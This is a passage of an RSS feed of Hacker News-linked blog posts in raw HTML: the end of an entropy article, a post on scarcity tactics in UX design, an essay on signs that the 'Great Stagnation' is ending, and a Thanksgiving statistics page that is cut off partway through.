Let there be \(N_L\) low-entropy states and \(N_H\) high-entropy states.
Then, just because \(T\) is a bijection, there must be \(N_L\) high-entropy states that become low-entropy.
Now if \(N_H \gg N_L\), then practically all high-entropy states go to other high-entropy states.
So \(L \mapsto H\) but \(H \mapsto H\).</p>
<p>Of course in reality, if you start with a low-entropy state and watch this unfold for a <em>really</em> long time, you’ll eventually see it become a low-entropy state again. It’s just extremely unlikely to happen in a short amount of time.</p>
<h2 id="entropy-is-not-exactly-your-uncertainty-about-the-microstate">Entropy is not exactly your uncertainty about the microstate</h2>
<p>The entropy of a given macrostate is the uncertainty …</p></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://erischel.com/demystifying-the-second-law-of-thermodynamics/">https://erischel.com/demystifying-the-second-law-of-thermodynamics/</a></em></p>]]>
            </description>
            <link>https://erischel.com/demystifying-the-second-law-of-thermodynamics/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191832</guid>
            <pubDate>Mon, 23 Nov 2020 21:02:16 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Using Behavioral Economics to Build Better Products]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25191745">thread link</a>) | @alanbr
<br/>
November 23, 2020 | https://lightit.io/blog/behavioral-economics-for-ux-conversions-scarcity/ | <a href="https://web.archive.org/web/*/https://lightit.io/blog/behavioral-economics-for-ux-conversions-scarcity/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://lightit.io/blog/content/images/size/w300/2020/11/behavioral-1.png 300w,
                            https://lightit.io/blog/content/images/size/w600/2020/11/behavioral-1.png 600w,
                            https://lightit.io/blog/content/images/size/w1000/2020/11/behavioral-1.png 1000w,
                            https://lightit.io/blog/content/images/size/w2000/2020/11/behavioral-1.png 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://lightit.io/blog/content/images/size/w2000/2020/11/behavioral-1.png" alt="Boost Conversions with Behavioral Science. P1: Scarcity">
            </figure>

            <section>
                <div>
                    <h2 id="ux-behavioral-economics">UX &amp; Behavioral Economics</h2><p>No matter how mature your digital platform is, there's always space for improvement. We've talked plenty about UX on this blog, understanding it as designing based on your users' insights. However, it's important to <strong>complement UX with behavioral science.</strong> This is a series of insights about human behavior that are <strong>true of all users.</strong> In the following blog posts, I'll reveal some behavioral insights that might help boost your conversions... <strong>Let's start with the first one: scarcity.</strong></p><h2 id="scarcity-motivates-conversions">Scarcity Motivates Conversions</h2><figure><img src="https://lightit.io/blog/content/images/2020/11/image.png" alt="Scarcity example booking"></figure><p>Have you ever booked a hotel on Booking? If you did, it would probably be easy for you to understand the scarcity heuristic.</p><p>Scarcity is<strong> </strong>the event where a product/service is perceived as more attractive because it's presented as limited in availability. Limitation gives people a sense of quality, exclusivity and even gives them the famous FOMO (fear of missing out) on a great product or discount. <strong>The scarcity heuristic can be used to pressure people into taking action</strong></p><p>Booking's example is pretty straightforward. While you're making your reservation, Booking tells you <strong>how many rooms are still available</strong> and even the <strong>number of people that are looking at the hotel simultaneously</strong> as you (and might steal the room you wish!) This last one isn't only a scarcity strategy, but also a social norm we'll look into in the next blog post. This information pressures people into reserving quickly before the other people book the last room.</p><p>I'm not saying Booking's strategy is effective (personally, I believe it's a little exaggerated to the point it looks fake). Still, it's a clear example of using scarcity to <strong>rush customers to make their decision</strong>. </p><p>Another famous example is from a grocery store in Iowa that did an exciting experiment with the discount they offered for Campbell's soups. They always provided the same discount, though some days, they hanged a sign next to the cans that read "Limit 12 Per Person", while other days they didn't have a limit. Take a look at these impressive results.<strong> Customers bought 7 cans on average when the limit was imposed, compared to an average of 3 cans on days with no limit.</strong></p><h3 id="so-how-can-i-take-this-to-my-digital-platform"><br>So... how can I take this to my digital platform?</h3><p>There are several strategies you might try; the key is on<strong> trying different alternatives and tracking down the metrics</strong> so that you figure out which one works. <strong>Remember not to over-do it</strong>; no one trusts sites with discounts and deals that last forever. The typical "subscribe now and get 20% off on your first order" isn't that attractive if it has no time limit. Though, if it has, it might motivate people to make up their minds faster. Benefits must be perceived "here and now" to be more valuable.</p><figure><img src="https://lightit.io/blog/content/images/2020/11/image-4.png" alt="Amazon scarcity example"></figure><p>Bear in mind these strategies aren't only useful for e-commerces, they can be used for other business models too. For example on social networks or communities, creating <strong>waiting lists, deadlines, asking for qualifications to join or limiting invites </strong>can really boost interest by giving a sense of &nbsp;<strong>exclusivity</strong> and FOMO. It's no news that exclusive things are more attractive... but have you ever wondered what came first? Attractiveness or exclusivity?</p><hr><p><strong>Stay tuned for the next post of this collection, </strong>Insights on Behavioral Economics to Improve Your Platform's Results. <strong>Part 2: Social Norms. </strong></p><!--kg-card-begin: markdown--><p>Subscribe to our newsletter &amp; follow us on <a href="https://www.linkedin.com/company/lightit//" target="_blank">Linkedin</a>.</p>
<!--kg-card-end: markdown--><hr><!--kg-card-begin: markdown--><p>Shoutout to  <a href="https://collectiveacademy.com///" target="_blank">Collective Academy</a>, where I took my course on Behavioral Economics and learned everything written in this article &lt;3</p>
<!--kg-card-end: markdown-->
                </div>
            </section>

                <section>
    <h3>Subscribe to Light-it Blog</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>
            

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://lightit.io/blog/behavioral-economics-for-ux-conversions-scarcity/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191745</guid>
            <pubDate>Mon, 23 Nov 2020 20:56:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cracks in the Great Stagnation]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25191733">thread link</a>) | @jseliger
<br/>
November 23, 2020 | https://www.agglomerations.tech/cracks-in-the-great-stagnation | <a href="https://web.archive.org/web/*/https://www.agglomerations.tech/cracks-in-the-great-stagnation">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1602611061438-ca00df2a4319?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1602611061438-ca00df2a4319?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1602611061438-ca00df2a4319?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1602611061438-ca00df2a4319?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1602611061438-ca00df2a4319?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Cracks in the Great Stagnation">
            </figure>

            <section>
                <div>
                    <p>For the last 60 years, we’ve seen consistently low productivity growth rates in the US and across the Western world. Meanwhile, recent scientific discoveries seem to be <a href="https://www.theatlantic.com/science/archive/2018/11/diminishing-returns-science/575665/">less fundamental</a> to our understanding of the world than previous breakthroughs have been. While the growth of digital technology has been tremendous since the 1990s, it’s the only significant part of our world that seems to have been changing. To look up from our smartphones is to see a physical environment that looks basically the same as it did in 1970. Innovation has been constrained to the world of bits and left the world of atoms mostly untouched.</p><p>This might finally be changing. Last month, the economist Tyler Cowen <a href="https://www.bloomberg.com/opinion/articles/2020-10-05/how-much-worse-can-things-get-that-question-may-be-a-good-sign">speculated</a> that we may be seeing signs that this <a href="https://www.amazon.com/Great-Stagnation-Low-Hanging-Eventually-eSpecial-ebook/dp/B004H0M8QS">Great Stagnation</a> is ending. Since his article was published, we’ve already seen almost a dozen announcements that have only driven home the point further. There seem to be cracks in the Great Stagnation and light is peeking through on the other end. </p><p><strong>Innovation in the physical world</strong><br>Most obviously, the recent announcement of the <a href="https://www.statnews.com/2020/11/09/covid-19-vaccine-from-pfizer-and-biontech-is-strongly-effective-early-data-from-large-trial-indicate/">successful development of several vaccines</a> to the novel coronavirus are a sign that America (with some help from Germany) is still capable of achieving Big Things when we are pushed to it. Despite consistent failings of the US regulatory state in <a href="https://slatestarcodex.com/2020/04/14/a-failure-but-not-of-prediction/">delaying the adoption</a> of face masks and in <a href="https://thedispatch.com/p/timeline-the-regulationsand-regulatorsthat">slowing the rollout</a> of mass testing, the US essentially bet the farm that our strong biotech clusters would be able to create a vaccine to a new disease in record time, and it looks like we’re going to be able to do it in under a year! </p><p>It’s worth highlighting just how speedy this development timeline is when compared to the vaccines for diseases like polio and measles. </p><figure><img src="https://www.agglomerations.tech/content/images/2020/11/Vaccination-innovation-chart.png" alt="" srcset="https://www.agglomerations.tech/content/images/size/w600/2020/11/Vaccination-innovation-chart.png 600w, https://www.agglomerations.tech/content/images/size/w1000/2020/11/Vaccination-innovation-chart.png 1000w, https://www.agglomerations.tech/content/images/size/w1600/2020/11/Vaccination-innovation-chart.png 1600w, https://www.agglomerations.tech/content/images/size/w2400/2020/11/Vaccination-innovation-chart.png 2400w" sizes="(min-width: 720px) 720px"><figcaption>https://ourworldindata.org/vaccination</figcaption></figure><p>And not only did we develop a new vaccine, we developed a new *type* of vaccine. mRNA vaccines have long been speculated to work, but this is the <a href="https://www.bostonherald.com/2020/11/20/pfizer-and-moderna-vaccines-showing-potential-success-of-mrna-platform-a-first/">first instance</a> of a successful vaccine application in humans using this technique. </p><p>In transportation, the promise of driverless cars has long been a centerpiece for a tech-optimistic vision of safer roads, better-designed cities, and eliminating the drudgery of a morning commute through traffic. But the technical delays of the last few years (when compared to the most optimistic timelines) have become a rallying cry for the <a href="https://blog.piekniewski.info/2018/05/28/ai-winter-is-well-on-its-way/">tech-skeptic</a> as well. </p><p>It seems like they may finally be getting here. A few weeks ago, <a href="https://arstechnica.com/cars/2020/10/waymo-finally-launches-an-actual-public-driverless-taxi-service/">Waymo announced</a> that their long-running pilot program in Arizona is going to be open to the public <a href="https://twitter.com/jjricks_/status/1316318196375330816">without any safety driver</a> in the front seat. Days later, Elon Musk and Tesla rolled out a new self-driving beta program. </p><figure><blockquote data-width="550"><p lang="en" dir="ltr">These two guys used a drone to make a video of Tesla's new "full self-driving" software in action. The drone, the self-driving car, and the global video-steaming service were all been science fiction when I was born. Living in the future is neat. <a href="https://t.co/4QqGcjFXsc">https://t.co/4QqGcjFXsc</a></p>— Timothy B. Lee (@binarybits) <a href="https://twitter.com/binarybits/status/1321102111883579397?ref_src=twsrc%5Etfw">October 27, 2020</a></blockquote>

</figure><p>This is a remarkable engineering feat, especially on Waymo’s end. It shows the company can successfully lead product development in an industry that relies on more stringent safety-critical engineering instead of the release-and-iterate model that its parent company grew up with. Waymo is evidence that Silicon Valley can “move at a moderate pace and not break things” when it needs to.</p><p>Granted, it’s unclear how long until and at what pace deployment of AVs to the rest of the country and the world will happen. If the Waymo model looks to be successful, it will be a steady, resource-intensive process of region-by-region expansion as the cars learn to handle new operational design domains and are rigorously validated in each city before the keys are turned over to the AI. In other words, expansion could look more like a cell phone coverage map than a software update that is instantaneously available everywhere. </p><p>But still, this is a significant, tangible mile marker that the industry has passed. AVs are operating in the wild now. We get to talk about *when* we reach the driverless future, not *if*. </p><p>In addition to the almost ho-hum daily progress in solar, wind, and battery technology where prices have fallen <a href="https://www.greentechmedia.com/articles/read/solar-pv-has-become-cheaper-and-better-in-the-2010s-now-what">90</a>, <a href="https://www.forbes.com/sites/energyinnovation/2020/01/21/renewable-energy-prices-hit-record-lows-how-can-utilities-benefit-from-unstoppable-solar-and-wind/?sh=491f10ec2c84">70</a>, and <a href="https://about.bnef.com/blog/battery-pack-prices-fall-as-market-ramps-up-with-market-average-at-156-kwh-in-2019">87</a> percent over the last ten years, we’ve also started to hear very promising reports about the development of more fundamental breakthroughs. The NYT reports that a compact nuclear fusion reactor is “<a href="https://www.nytimes.com/2020/09/29/climate/nuclear-fusion-reactor.html?action=click&amp;module=News&amp;pgtype=Homepage">Very Likely to Work</a>” after a major theoretical advancement. There was also a fantastic David Robert’s <a href="https://www.vox.com/energy-and-environment/2020/10/21/21515461/renewable-energy-geothermal-egs-ags-supercritical">deep dive into geothermal energy</a> and the promise of advanced geothermal (whereby water pumped into the ground through a closed loop reaches a high enough temperature that it becomes “supercritical” and can carry 10x more energy per unit mass), in particular. Either technology, if perfected, would provide abundant, zero-carbon, baseload energy that is available anywhere around the world. </p><p>Cowen mentions briefly the huge market growth we’ve seen in lab-grown meat and plant-based alternatives. A few weeks ago it was announced that Impossible Foods, one of the largest actors in the industry is <a href="https://venturebeat.com/2020/10/20/impossible-foods-will-double-rd-to-eliminate-animal-farming/">doubling their R&amp;D team</a> as they seek to take on plant-based milk, steak, and fish as well as improve the supply chains for plant proteins. In tandem, McDonald’s <a href="https://www.washingtonpost.com/food/2020/11/10/mcdonalds-mcplant-sandwich/">just announced</a> that in 2021 they are going to be testing out a new McPlant menu.</p><p><strong>Digital innovation continues apace</strong></p><p>Not to be left out, in the digital world we’ve been seeing impressive progress as well. AI techniques like deepfakes which have been heralded as the <a href="https://www.sundayguardianlive.com/opinion/deepfakes-destroy-democracy">death knell for democracy</a> are now being <a href="https://arstechnica.com/gadgets/2020/11/nvidia-used-neural-networks-to-improve-video-calling-bandwidth-by-10x/">deployed by NVIDIA</a> to increase video fidelity while cutting bandwidth transmission for video calls by a factor of 10. In general, techniques to reduce bandwidth use are greatly underrated, and it’s going to be exciting to see the ways in which smarter compression can perhaps bring similar efficiency gains across the board. </p><p>And now factor in the steady rollout of 5G network technologies which promise to increase the raw bandwidth available to all mobile devices. With the combination of smarter compression and vastly increased bandwidth we could be looking at a baseline 50x increase in network capacity over the next decade. It’s hard to predict ahead of time what new applications will be enabled by all this new capacity, but in retrospect it could look like another example of <a href="https://diff.substack.com/p/how-bubbles-and-megaprojects-parallelize">parallel innovation</a> that both enables and is driven by the growth of VR/AR, driverless vehicles, and telehealth.*</p><p><em>*For those who are skeptical that increased capacity will generate new applications because a few cities have tried gigabit broadband<a href="https://www.wsj.com/graphics/faster-internet-not-worth-it/"> without much effect</a>, I would argue that both hardware and app developers are optimizing for the baseline user experience and we won’t see a ton of investment in new applications until we’ve changed the baseline capacity that developers can expect a sizeable user base to have. </em></p><p>Equally as impressive, Apple’s new M1 chip that was launched on November 10th seems to have taken the world by storm. As John Gruber <a href="https://daringfireball.net/2020/11/the_m1_macs">summarizes</a>: “To acknowledge how good they are — and I am here to tell you they are astonishingly good — you must acknowledge that certain longstanding assumptions about how computers should be designed, about what makes a better computer better, about what good computers need, are wrong.” Just as interesting is <a href="https://medium.com/pcmag-access/what-is-the-apple-m1-chip-613935ea0903">how they did it</a>. By miniaturizing the whole system architecture and integrating it onto a single chip (no discrete RAM, graphics card, etc.) Apple has managed to pump out massive efficiency gains both in processing power and in battery life. (There’s perhaps a metaphor here for the <a href="https://www.wsj.com/articles/breaking-up-big-tech-is-hard-to-do-1532290123">value of integration</a> for large tech firms as well…)</p><figure><img src="https://lh5.googleusercontent.com/tXP4ZnW93TIsJ_dJe3NVmevfz5eMUnNC6CS40Dz_S0568BDiQKr8K8LqT5Ja-kLnXUKnS1UkDQf_6WYzBhfGa4c99lQDfqudhQaDF-XCYBEkxNoP3Vo3FlGtLl3sGFQcdtHBlGbv" alt=""><figcaption>https://techcrunch.com/2020/11/17/yeah-apples-m1-macbook-pro-is-powerful-but-its-the-battery-life-that-will-blow-you-away/</figcaption></figure><p>Finally, the virtual reality space has seen its most impressive entrant in years with the arrival of the Quest 2 from Facebook on October 13th. There is no VR headset that matches it on a performance/cost basis, and the relative simplicity and elegance of the system makes it an ideal entry point. The deliberately low entry barrier of $299 is meant to entice a large enough user base that it kickstarts the virtuous cycle of having a significant enough market for dedicated VR developers to make significant investments in new applications, which then drives new user growth. Facebook believes we finally have a minimum viable product for VR that means this kind of two-sided market is possible, and it is betting billions of dollars to make it happen. Early signs seem to show that it is working as intended with <a href="https://www.theverge.com/2020/10/30/21541535/oculus-quest-2-preorders-sales-developers-zuckerberg">pre-orders reportedly 5x</a> larger than the original Quest, popular applications like Beat Saber seeing record growth, and all this with the upcoming holiday rush and a massive advertising blitz to come. </p><p>Notably, all of these announcements/developments I’ve outlined have occurred in just the last few months. This is by no means a comprehensive look at the exciting progress being made in many other fields. But the sheer scope and pace of tangible changes to our physical and digital words is something to be excited about.</p><p><strong>A few caveats </strong></p><p>Some of these innovations will boost productivity in the traditional ways that show up in economic growth statistics. We should strive for and celebrate those achievements. But some of these innovations won’t necessarily, instead they make human civilization more durable and sustainable in a variety of ways. In response, we should start to think of increased sustainability as a type of productivity. </p><p>A vaccine to the COVID pandemic is the most obvious example. While economic statistics won’t show a boost in productivity compared to the pre-COVID economy because of the vaccine, the ability to return to trend is itself incredibly valuable. In fact, measured labor productivity from the vaccine will likely fall as lower-wage …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.agglomerations.tech/cracks-in-the-great-stagnation">https://www.agglomerations.tech/cracks-in-the-great-stagnation</a></em></p>]]>
            </description>
            <link>https://www.agglomerations.tech/cracks-in-the-great-stagnation</link>
            <guid isPermaLink="false">hacker-news-small-sites-25191733</guid>
            <pubDate>Mon, 23 Nov 2020 20:55:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Turkey birds gained 78% more weight since 1960! - Thanksgiving facts]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25191707">thread link</a>) | @bagsaway
<br/>
November 23, 2020 | https://bagsaway.com/blog/thanksgiving-statistics/ | <a href="https://web.archive.org/web/*/https://bagsaway.com/blog/thanksgiving-statistics/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<div>

<h2>Table of contents:</h2>
<ol><li><a href="#anchor-1">Thanksgiving turkey</a></li><li><a href="#anchor-2">Travel Thanksgiving statistics</a></li><li><a href="#anchor-3">Food and Cooking</a></li><li><a href="#anchor-4">Macy’s Thanksgiving Day parade</a></li><li><a href="#anchor-x">Drinksgiving</a></li><li><a href="#anchor-5">Shopping and ecommerce</a></li><li><a href="#anchor-6">NFL Thanksgiving Day games</a></li><li><a href="#anchor-7">Friendsgiving</a></li><li><a href="#anchor-y">Thanksgiving dangers and safety</a></li><li><a href="#anchor-8">Thanksgiving around the world</a></li></ol>
<p>Thanksgiving 2020 will be unique in many aspects. Therefore we prepared for you a wide collection of up to date Thanksgiving statistics and numbers covering many different sides of this lovely holiday. You will also find surprising insights that we uncovered for you. </p>
<p>You can use this information either to prepare yourself for the holiday ahead, to spice up your knowledge or to set up the marketing of your small business to get the most value of the holiday by understanding the shopping habits, attitudes among younger generations towards Thanksgiving, potential spikes in drinking occasions, expected price discounts, online vs online shopping dimensions, how many people will travel, where they will go and a lot more. </p>
<div><p>
<h2 id="anchor-1">Thanksgiving turkey </h2>
<h3>How much turkey meat does the United States produce?</h3>
</p></div>
<p><strong>2.5 million tons</strong> is the average turkey meat production in the United States between 1993 and 2018. </p>
<p>The United States leads the world in production of turkey meat. It’s followed far behind by France with 413 thousand tons of produced turkey, Germany with 367 thousand tons, Italy 311 thousand tons, Brazil 310 thousand tons, and then comes the United Kingdom, Canada, Israel, Hungary and Poland.</p>
<div><figure><img src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?w=910&amp;ssl=1" alt="Chart: Production of turkey meat by countries. Top 10 producers globally measured by average production in tons from 1993 to 2018.  " srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=720%2C525&amp;ssl=1 720w" sizes="(max-width: 740px) 100vw, 740px" title="Thanksgiving Statistics, 80+ intriguing stats 2 | BagsAway" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?resize=720%2C525&amp;ssl=1 720w" data-lazy-src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Turkey-meat.png?w=910&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Top 10 producers of turkey meat in the world</figcaption></figure></div>
<h3>How many turkeys are cooked and eaten in the United States on Thanksgiving?</h3>
<p><strong>40 million turkeys</strong> is the correct number based on more recent reports by the National Turkey Federation and <a href="https://www.bloomberg.com/news/videos/2020-10-30/turkey-farmers-worry-about-thanksgiving-video" target="_blank" rel="noopener">Bloomberg</a>.</p>
<p>Otherwise most likely you will see information that 46 million turkeys are eaten in the United States on Thanksgiving, but this number is out of date and because of that is incorrect. </p>
<p>Anyway, getting to sales and consumption of 40 million turkeys this year may be a challenging goal. Based on Bloomberg reports, there is an uncertainty and fear among turkey farmers about what will be the consumption of turkey this year. </p>
<p>At the moment there is a surplus of turkeys compared to stock levels in 2019, also there is a tendency for people to order smaller turkeys because of a potentially downsized Thanksgiving celebration in 2020. Turkey as a Thanksgiving dish faces additional pressure from substitute products, turkey breasts, Guinea fowls, hens, and similar replacements. The National Turkey Federation reminds people that they don’t have to restrict themselves in the purchase of turkey this year. After all, you can use turkey leftovers and make other tasty dishes, they say. </p>
<h3>How many turkey farms are there in the United States?</h3>
<p><strong>2,500</strong>, according to USDA. </p>
<h3>How many turkeys are raised every year in the United States?</h3>
<p><strong>229 million</strong>, according to USDA.</p>
<h3>How many turkeys are consumed in Canada on Thanksgiving?</h3>
<p><strong>2.5 million turkeys</strong> were purchased in Canada for Thanksgiving in 2019, that’s about <strong>39%</strong> of the yearly turkey sales in Canada. (<a href="https://www.turkeyfarmersofcanada.ca/industry-information/industry-statistics/" target="_blank" rel="noopener">TurkeyFarmersofCanada</a>)</p>
<p>As a reminder, Thanksgiving in Canada is celebrated earlier on the second Monday of October. </p>
<h3>How much people in the United States will spend on turkey in 2020?</h3>
<p><strong>$1.095 billion</strong> is expected that Americans will spend on turkey only for Thanksgiving this year, according to Finder. </p>
<h3>What is the average weight of a turkey?</h3>
<p><strong>30</strong> <strong>pounds</strong> <strong>(13.6 kilograms)</strong> and slightly above that, but it weighed 16.83 pounds (7.63 kilograms) in 1960, according to <a href="https://www.wsj.com/articles/talking-turkey-why-your-thanksgiving-dinner-weighs-more-1448015402#:~:text=In%201960%2C%20the%20average%20commercial,at%20more%20than%2030%20pounds." target="_blank" rel="noopener">WSJ</a>. That’s an increase of more than 78% for a 60 years period. A surprising fact about the turkey bird, but true. To put things in perspective the average weight of humans was 166.3 pounds (75.4 kilograms) in 1960 and it went up to 195.5 pounds (88.6 kilograms) nowadays, an increase of 18%, according to WSJ. </p>
<div><figure><img src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?w=910&amp;ssl=1" alt="Chart: Weight increase of turkey birds and humans from 1960 to 2020" srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=720%2C525&amp;ssl=1 720w" sizes="(max-width: 740px) 100vw, 740px" title="Thanksgiving Statistics, 80+ intriguing stats 3 | BagsAway" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?w=740&amp;ssl=1 740w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=300%2C219&amp;ssl=1 300w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=320%2C234&amp;ssl=1 320w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=640%2C467&amp;ssl=1 640w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=360%2C263&amp;ssl=1 360w, https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?resize=720%2C525&amp;ssl=1 720w" data-lazy-src="https://i0.wp.com/bagsaway.com/blog/wp-content/uploads/2020/11/Weight-increase-of-turkey-birds-and-humans-from-1960-to-2020.png?w=910&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"><figcaption>Weight increase of turkey birds and humans between 1960 and 2020</figcaption></figure></div>
<h3>How much edible meat yields roasted turkey?</h3>
<p><strong>0.71 pounds</strong> edible meat is left from each pound of roasted whole turkey. (USDA) </p>
<h3>What is the ratio of frozen vs fresh turkeys sold for Thanksgiving in the U.S.?</h3>
<p><strong>2/3</strong> approximately are sold frozen, <strong>1/3</strong> are sold as fresh turkey, according to USDA. </p>
<h3>Thanksgiving turkey price</h3>
<h4>What was the average price of 16 pounds turkey in the United States in 2019?</h4>
<p><strong>$20.8</strong> according to Supermarket News.</p>
<h4>What is the cheapest and most expensive price of different Thanksgiving turkey types in major retail channels? </h4>
<p>According to data from CNBC, these selected types of turkey have the following prices: </p>
<p>Butterball frozen premium turkey:</p>
<ul><li><strong>$0.89</strong> per pound is the cheapest one, sold at Albertson in 2020 and <strong>$0.87</strong> per pound was the cheapest one in 2019, sold at Tesco</li><li><strong>$1.69</strong><span> per pound is the most expensive one in 2020, sold at Giant Eagle, and </span><strong>$1.59</strong><span> per pound was the most expensive one in 2019, sold at Giant Eagle. </span></li></ul>
<p>Butterball fresh turkey:</p>
<ul><li><strong>$0.99</strong> per pound is the cheapest one in 2020 and 2019, sold at Costco.</li><li><strong>$2.99</strong> per pound was the most expensive one in 2019, sold at Costco too. </li></ul>
<p>Whole frozen turkey of any type (excluding Butterball):</p>
<ul><li><strong>$0.29</strong> per pound is the cheapest one, sold at Food Lion and Kroger. </li><li><strong>$2.19 </strong>per pound is the most expensive one in 2020, sold at Wegmans, but this sort is free from unwanted substances and <strong>$2.99 </strong>per pound<strong> </strong>was the most expensive one in 2019, sold at Aldi. </li></ul>
<p>Whole fresh turkey of any type (excluding Butterball):</p>
